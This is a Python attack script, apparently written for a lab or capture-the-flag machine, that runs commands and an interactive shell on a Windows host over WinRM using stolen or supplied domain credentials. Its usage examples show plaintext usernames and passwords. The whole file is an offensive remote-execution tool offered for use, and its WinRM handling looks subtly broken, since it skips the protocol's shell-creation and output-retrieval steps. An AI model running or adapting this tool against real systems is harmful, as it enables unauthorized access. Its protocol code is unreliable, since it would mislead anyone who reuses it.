#!/usr/bin/env python3
# ============================================
# Script: war_rce.py - Windows RCE via WinRM
# Uso: python3 war_rce.py <usuario> <password> <IP> <comando>
# Ejemplo: python3 war_rce.py anderson.w 'Password123!' 10.129.81.107 'whoami'
# ============================================

import sys
import base64
import requests
import urllib3
import xml.etree.ElementTree as ET
from requests_ntlm import HttpNtlmAuth

# Deshabilitar advertencias SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def execute_command(username, password, ip, command):
    """
    Ejecuta un comando en Windows a través de WinRM
    """
    # URL del endpoint WinRM
    url = f"https://{ip}:5986/wsman"
    
    # Autenticación NTLM
    auth = HttpNtlmAuth(f"danglingtree\\{username}", password)
    
    # Headers SOAP
    headers = {
        'Content-Type': 'application/soap+xml;charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }
    
    # Cuerpo SOAP para ejecutar comando
    body = f'''<?xml version="1.0" encoding="UTF-8"?>
    <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" 
                xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" 
                xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
        <s:Header>
            <w:ResourceURI s:mustUnderstand="true">
                http://schemas.dmtf.org/wbem/wsman/1/windows/shell/cmd
            </w:ResourceURI>
            <w:OptionSet>
                <w:Option Name="WINRS_CONSOLEMODE_STDIN">TRUE</w:Option>
                <w:Option Name="WINRS_SKIP_CMD_SHELL">FALSE</w:Option>
            </w:OptionSet>
            <w:SelectorSet>
                <w:Selector Name="ShellId">shell-{base64.b64encode(command.encode()).decode()[:8]}</w:Selector>
            </w:SelectorSet>
            <w:OperationTimeout>PT60S</w:OperationTimeout>
        </s:Header>
        <s:Body>
            <rsp:CommandLine>
                <rsp:Command>{command}</rsp:Command>
            </rsp:CommandLine>
        </s:Body>
    </s:Envelope>'''
    
    try:
        # Enviar solicitud
        response = requests.post(url, auth=auth, headers=headers, data=body, verify=False, timeout=30)
        
        if response.status_code == 200:
            # Parsear respuesta
            root = ET.fromstring(response.text)
            ns = {
                's': 'http://www.w3.org/2003/05/soap-envelope',
                'w': 'http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd'
            }
            
            # Extraer salida
            stdout_elem = root.find('.//rsp:StdOut', {'rsp': 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell'})
            if stdout_elem is not None and stdout_elem.text:
                # Decodificar Base64
                try:
                    output = base64.b64decode(stdout_elem.text).decode('utf-8', errors='ignore')
                    return output.strip()
                except:
                    return stdout_elem.text
            return "Comando ejecutado sin salida"
        else:
            return f"Error: {response.status_code} - {response.text}"
    except Exception as e:
        return f"Error: {str(e)}"

def interactive_shell(username, password, ip):
    """
    Shell interactiva a través de WinRM
    """
    print(f"\n[+] Shell interactiva como {username}@{ip}")
    print("[+] Comandos disponibles: whoami, dir, type, etc.")
    print("[+] Escribe 'exit' para salir\n")
    
    while True:
        try:
            cmd = input(f"{username}@Windows> ")
            if cmd.lower() in ['exit', 'quit']:
                break
            if cmd.strip():
                result = execute_command(username, password, ip, cmd)
                print(result)
        except KeyboardInterrupt:
            print("\n[!] Saliendo...")
            break

def main():
    if len(sys.argv) < 4:
        print("=" * 50)
        print("war_rce.py - Windows RCE via WinRM")
        print("=" * 50)
        print("Uso:")
        print(f"  {sys.argv[0]} <usuario> <password> <IP> [comando]")
        print("  {sys.argv[0]} <usuario> <password> <IP> --shell")
        print("\nEjemplos:")
        print(f"  {sys.argv[0]} anderson.w Password123! 10.129.81.107 whoami")
        print(f"  {sys.argv[0]} anderson.w Password123! 10.129.81.107 --shell")
        print(f"  {sys.argv[0]} noah.b RiverDragon#Storm25 10.129.81.107 --shell")
        sys.exit(1)
    
    username = sys.argv[1]
    password = sys.argv[2]
    ip = sys.argv[3]
    
    # Verificar si es modo shell
    if len(sys.argv) >= 5 and sys.argv[4] == '--shell':
        interactive_shell(username, password, ip)
    else:
        command = ' '.join(sys.argv[4:]) if len(sys.argv) >= 5 else 'whoami'
        print(f"[+] Ejecutando: {command}")
        result = execute_command(username, password, ip, command)
        print(result)

if __name__ == "__main__":
    main()
